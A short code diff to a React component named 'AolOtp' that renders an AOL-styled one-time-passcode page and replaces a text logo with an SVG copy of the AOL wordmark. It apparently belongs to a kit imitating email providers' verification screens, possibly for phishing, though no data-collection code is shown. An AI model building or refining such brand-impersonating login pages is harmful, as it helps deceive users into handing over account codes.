@@ -28,8 +28,12 @@ const AolOtp: React.FC<OtpProviderProps> = ({ email, errorMessage, isLoading, ot
     <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#fafafa', fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
       <div className="w-full max-w-md">
         <div className="text-center mb-6">
-          <svg viewBox="0 0 80 40" className="mx-auto h-10 mb-6">
-            <text x="0" y="32" fill="#39007E" fontSize="36" fontWeight="700" fontFamily="'Helvetica Neue',Arial">Aol</text>
+          <svg viewBox="0 0 200 72" className="mx-auto h-10 mb-6">
+            <g fill="#000000">
+              <path d="M0 72 L25 0 H41 L66 72 H49 L43 52 H23 L17 72 Z M27 40 L33 14 L39 40 Z"/>
+              <path d="M103 2 A34 34 0 1 1 103 70 A34 34 0 1 1 103 2 Z M103 19 A17 17 0 1 0 103 53 A17 17 0 1 0 103 19 Z"/>
+              <path d="M144 0 H162 V54 H200 V72 H144 Z"/>
+            </g>
           </svg>
         </div>
 
